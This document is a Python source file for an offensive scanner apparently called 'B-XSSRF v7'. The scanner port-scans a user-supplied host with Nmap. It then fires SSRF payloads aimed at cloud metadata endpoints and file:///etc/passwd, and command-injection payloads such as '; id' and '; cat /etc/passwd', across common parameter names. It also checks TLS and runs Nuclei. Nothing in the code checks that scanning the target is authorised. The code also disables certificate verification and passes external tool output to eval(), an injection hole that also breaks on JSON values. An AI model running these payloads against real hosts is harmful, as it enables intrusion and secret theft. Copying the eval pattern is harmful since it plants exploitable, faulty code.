"""
Infrastructure Scanner for B-XSSRF v7.
Performs network reconnaissance and vulnerability scanning.
"""

from __future__ import annotations

import socket
import ssl
import subprocess
from datetime import datetime
from typing import Any

import nmap
import requests
from rich.console import Console
from rich.table import Table

from config_loader import get_infrastructure_config
from logging_setup import get_logger, log_operation

console = Console()
logger = get_logger(__name__)


class ServerScanner:
    """Comprehensive infrastructure security scanner."""

    def __init__(self, target: str) -> None:
        self.target = target
        self.config = get_infrastructure_config()
        self.nm = nmap.PortScanner()
        self.open_ports: list[int] = []
        self.services: dict[int, dict[str, Any]] = {}

    def scan_ports(self) -> list[int]:
        """
        Scan ports using Nmap.

        Returns:
            List of open ports
        """
        port_config = self.config.port_scan

        with log_operation("port_scan", target=self.target, ports=port_config.ports):
            console.print(f"[bold blue][*][/bold blue] Scanning Ports for: [bold cyan]{self.target}[/bold cyan]...")

            try:
                args = f"-p {port_config.ports} -T{port_config.timing}"
                if port_config.service_detection:
                    args += " -sV"
                if port_config.os_detection:
                    args += " -O"
                if port_config.scan_type == "syn":
                    args += " -sS"
                elif port_config.scan_type == "connect":
                    args += " -sT"
                elif port_config.scan_type == "udp":
                    args += " -sU"

                self.nm.scan(self.target, arguments=args)

                if self.target not in self.nm.all_hosts():
                    console.print("[bold yellow][!] Host seems down or not responding[/bold yellow]")
                    return []

                for proto in self.nm[self.target].all_protocols():
                    ports = self.nm[self.target][proto].keys()
                    for port in ports:
                        state = self.nm[self.target][proto][port]["state"]
                        if state == "open":
                            self.open_ports.append(port)
                            self.services[port] = {
                                "protocol": proto,
                                "service": self.nm[self.target][proto][port].get("name", "unknown"),
                                "version": self.nm[self.target][proto][port].get("version", ""),
                                "product": self.nm[self.target][proto][port].get("product", ""),
                            }

                console.print(f"[bold green][+][/bold green] Open Ports Found: {self.open_ports}")
                return self.open_ports

            except Exception as e:
                logger.error("nmap_scan_failed", error=str(e))
                console.print(f"[bold red][!] Nmap Error: {e}[/bold red]")
                return []

    def check_ssrf(self) -> bool:
        """
        Test for SSRF vulnerabilities on discovered web ports.

        Returns:
            True if potential SSRF found
        """
        console.print("[bold blue][*][/bold blue] Testing for SSRF vulnerabilities...")

        web_ports = [p for p in self.open_ports if self.services.get(p, {}).get("service") in ("http", "https", "http-proxy")]
        if not web_ports:
            # Try common web ports anyway
            web_ports = [p for p in self.open_ports if p in (80, 443, 8080, 8443, 8000, 3000)]

        vulnerable = False

        for port in web_ports:
            scheme = "https" if port in (443, 8443) else "http"
            base_url = f"{scheme}://{self.target}:{port}"

            # Test various SSRF payloads
            payloads = [
                "http://127.0.0.1:80",
                "http://localhost:80",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal",
                "file:///etc/passwd",
                "http://10.0.0.1",
            ]

            for payload in payloads:
                if self._test_ssrf_endpoint(base_url, payload):
                    console.print(f"[bold red][!] Possible SSRF on {base_url} with payload: {payload}[/bold red]")
                    vulnerable = True

        return vulnerable

    def _test_ssrf_endpoint(self, base_url: str, payload: str) -> bool:
        """Test a single endpoint for SSRF."""
        # Common parameter names for SSRF
        params = ["url", "uri", "link", "target", "redirect", "next", "callback", "webhook", "image", "src"]

        for param in params:
            try:
                url = f"{base_url}/?{param}={requests.utils.quote(payload)}"
                r = requests.get(url, timeout=5, verify=False, allow_redirects=False)

                # Check for signs of successful SSRF
                if r.status_code == 200:
                    content = r.text.lower()
                    # Look for metadata service responses
                    if any(x in content for x in ["ami-id", "instance-id", "hostname", "local-ipv4", "public-ipv4", "root:", "daemon:"]):
                        return True
                    # Look for file content
                    if "root:" in content and "/etc/passwd" in payload:
                        return True

            except requests.RequestException:
                continue

        return False

    def check_rce(self) -> bool:
        """
        Test for RCE vulnerabilities on discovered web ports.

        Returns:
            True if potential RCE found
        """
        console.print("[bold blue][*][/bold blue] Testing for RCE vulnerabilities...")

        web_ports = [p for p in self.open_ports if self.services.get(p, {}).get("service") in ("http", "https", "http-proxy")]
        if not web_ports:
            web_ports = [p for p in self.open_ports if p in (80, 443, 8080, 8443, 8000, 3000)]

        for port in web_ports:
            scheme = "https" if port in (443, 8443) else "http"
            base_url = f"{scheme}://{self.target}:{port}"

            # Basic command injection tests
            payloads = [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "&& id",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
            ]

            for payload in payloads:
                if self._test_rce_endpoint(base_url, payload):
                    console.print(f"[bold red][!] Possible RCE on {base_url} with payload: {payload}[/bold red]")
                    return True

        return False

    def _test_rce_endpoint(self, base_url: str, payload: str) -> bool:
        """Test a single endpoint for RCE."""
        params = ["cmd", "command", "exec", "run", "shell", "query", "input", "data"]

        for param in params:
            try:
                url = f"{base_url}/?{param}={requests.utils.quote(payload)}"
                r = requests.get(url, timeout=5, verify=False)

                if "uid=" in r.text and "gid=" in r.text:
                    return True
                if "root:" in r.text and "/etc/passwd" in payload:
                    return True

            except requests.RequestException:
                continue

        return False

    def check_ssl(self) -> dict[str, Any]:
        """
        Analyze SSL/TLS configuration.

        Returns:
            SSL analysis results
        """
        if not self.config.ssl_analysis.enabled:
            return {}

        console.print("[bold blue][*][/bold blue] Analyzing SSL/TLS configuration...")

        results = {
            "certificate": {},
            "protocols": [],
            "ciphers": [],
            "issues": [],
        }

        for port in self.open_ports:
            service = self.services.get(port, {}).get("service", "")
            if service not in ("https", "ssl", "https-alt"):
                continue

            try:
                cert_info = self._get_certificate_info(port)
                results["certificate"][port] = cert_info

                # Check for weak protocols/ciphers
                issues = self._check_ssl_issues(port, cert_info)
                results["issues"].extend(issues)

            except Exception as e:
                logger.error("ssl_check_failed", port=port, error=str(e))
                results["issues"].append(f"Port {port}: SSL check failed - {e}")

        return results

    def _get_certificate_info(self, port: int) -> dict[str, Any]:
        """Get SSL certificate information."""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with socket.create_connection((self.target, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                protocol = ssock.version()

                return {
                    "subject": dict(x[0] for x in cert.get("subject", [])),
                    "issuer": dict(x[0] for x in cert.get("issuer", [])),
                    "version": cert.get("version"),
                    "serial_number": cert.get("serialNumber"),
                    "not_before": cert.get("notBefore"),
                    "not_after": cert.get("notAfter"),
                    "san": cert.get("subjectAltName", []),
                    "cipher": cipher[0] if cipher else None,
                    "protocol": protocol,
                }

    def _check_ssl_issues(self, port: int, cert_info: dict[str, Any]) -> list[str]:
        """Check for SSL/TLS issues."""
        issues = []

        # Check expiry
        try:
            not_after = datetime.strptime(cert_info["not_after"], "%b %d %H:%M:%S %Y %Z")
            if not_after < datetime.utcnow():
                issues.append(f"Port {port}: Certificate EXPIRED")
            elif (not_after - datetime.utcnow()).days < 30:
                issues.append(f"Port {port}: Certificate expires soon ({cert_info['not_after']})")
        except Exception:
            pass

        # Check for weak protocols
        weak_protocols = ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]
        if cert_info.get("protocol") in weak_protocols:
            issues.append(f"Port {port}: Weak protocol {cert_info['protocol']}")

        # Check for weak ciphers
        weak_ciphers = ["RC4", "DES", "3DES", "MD5", "NULL", "EXPORT", "ANON"]
        cipher = cert_info.get("cipher", "").upper()
        for weak in weak_ciphers:
            if weak in cipher:
                issues.append(f"Port {port}: Weak cipher {cipher}")
                break

        return issues

    def run_nuclei_scan(self) -> list[dict[str, Any]]:
        """
        Run Nuclei vulnerability scanner (if available).

        Returns:
            List of findings
        """
        vuln_config = self.config.vulnerability_scan
        if not vuln_config.enabled:
            return []

        console.print("[bold blue][*][/bold blue] Running Nuclei vulnerability scan...")

        try:
            cmd = ["nuclei", "-target", self.target]
            if vuln_config.severity:
                cmd.extend(["-severity", ",".join(vuln_config.severity)])
            if vuln_config.tags:
                cmd.extend(["-tags", ",".join(vuln_config.tags)])
            if vuln_config.templates_path:
                cmd.extend(["-t", vuln_config.templates_path])

            cmd.extend(["-json", "-silent"])

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            findings = []
            for line in result.stdout.strip().split("\n"):
                if line:
                    try:
                        findings.append(eval(line))  # Nuclei outputs JSON lines
                    except Exception:
                        pass

            return findings

        except FileNotFoundError:
            logger.warning("nuclei_not_installed")
            return []
        except Exception as e:
            logger.error("nuclei_scan_failed", error=str(e))
            return []


def run_server_module() -> dict[str, Any]:
    """CLI entry point for infrastructure scanning."""
    target = console.input("[bold yellow]Enter Target IP/Domain: [/bold yellow]")
    scanner = ServerScanner(target)

    # Run scans
    ports = scanner.scan_ports()
    ssrf_status = scanner.check_ssrf()
    rce_status = scanner.check_rce()
    ssl_results = scanner.check_ssl()

    # Display results
    table = Table(title="Server Scan Results")
    table.add_column("Service", style="cyan")
    table.add_column("Status", style="magenta")

    table.add_row("Open Ports", str(ports))
    table.add_row("SSRF Vulnerability", "[red]VULNERABLE[/red]" if ssrf_status else "[green]SAFE[/green]")
    table.add_row("RCE Vulnerability", "[red]VULNERABLE[/red]" if rce_status else "[green]SAFE[/green]")

    if ssl_results.get("issues"):
        table.add_row("SSL Issues", f"[yellow]{len(ssl_results['issues'])} issues found[/yellow]")

    console.print(table)

    return {
        "target": target,
        "ports": ports,
        "services": scanner.services,
        "ssrf": ssrf_status,
        "rce": rce_status,
        "ssl": ssl_results,
    }


if __name__ == "__main__":
    run_server_module()
